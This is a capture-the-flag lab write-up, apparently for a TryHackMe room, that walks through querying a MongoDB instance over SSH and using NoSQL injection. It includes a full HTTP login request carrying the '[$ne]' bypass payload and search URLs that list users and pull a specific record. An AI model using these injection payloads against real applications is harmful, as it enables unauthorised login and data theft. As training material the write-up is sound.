## TASK-1  Interact with the MongoDB server to find the flag. What is the flag? 

Use nmap to scan the IP. You will find port <strong>2222</strong> hosting SSH. try to connect to ssh using the credential ```thm:tryhackme```

```bash
ssh thm@MACHINE_IP -p 2222
```

Once you are on the system remotely via SSH, load up the mongo database using the command ```mongo```.<br>
Run the following command to list the databases.

```bash
> show databases
admin   0.000GB
config  0.000GB
flagdb  0.000GB
local   0.000GB
```
The interesting database names -  <b>admin</b> and <b>flagdb</b>. But we will be looking into the flagdb database to get our flag for the first question.<br>
We use the ```use``` command to connect to a specific database in MongoDB, in this case <b>flagdb</b>.

```bash
> use flagdb
switched to db flagdb
```

Now to see the collections inside the flagdb database use the following command.

```bash
> db.getCollectionNames();
[ "flagColl" ]
```

Now we can see that "flagColl" is the collection inside the flagdb databse that might be holding the flag.
Running the below command to list the contents inside the "flagColl" gives us the flag inside.

```bash
> db.flagColl.find()
{ "_id" : ObjectId("618806af0afbc09bdf42bd6a"), "flag" : "THM{REDACTED}" }
```

## TASK-2 Once you are logged in, use the gift search page to list all usernames that have guest roles. What is the flag?

Intercept the POST /login request in the home page of the site. Since we know that the database in use is <b>MongoDB</b>.
We can try to inject some queries which result's to login bypass.

```
POST /login HTTP/1.1
Host: 10.10.54.102
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://10.10.54.102
DNT: 1
Connection: close
Referer: http://10.10.54.102/login
Cookie: connect.sid=s%3Act9adcXA4grbm68lhw9haiRGZT30XQ7r.Tnmf2P4Sb4meUT4%2B7r1F9d4nchbXnG8iZ6ns%2FUHuGzU
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin&password[$ne]=admin
```

If you are not familiar with MongoDB commands, then let me explain the logic is ```username=admin and password != admin```. The same idea is used here. <br>
This helps us bypass the login page and we successfully login as a privileged user <b>admin</b>.

On the dashboard you can see the flag : ```THM{REDACTED}```


## TASK-3 Once you are logged in, use the gift search page to list all usernames that have guest roles. What is the flag?

Use the same idea here. The search url is ```http://MACHINE_IP/search?username[$ne]=blabla&role=guest```. and you can list all the users with guest roles.
```THM{REDACTED}```

## TASK-4 Use the gift search page to perform NoSQL injection and retrieve the mcskidy record. What is the details record?

Use the same idea here. The search url is ```http://MACHINE_IP/search?username=mcskidy&role[$ne]=blabla```. and you have the flag.
```ID:REDACTED:mcskidy:admin```


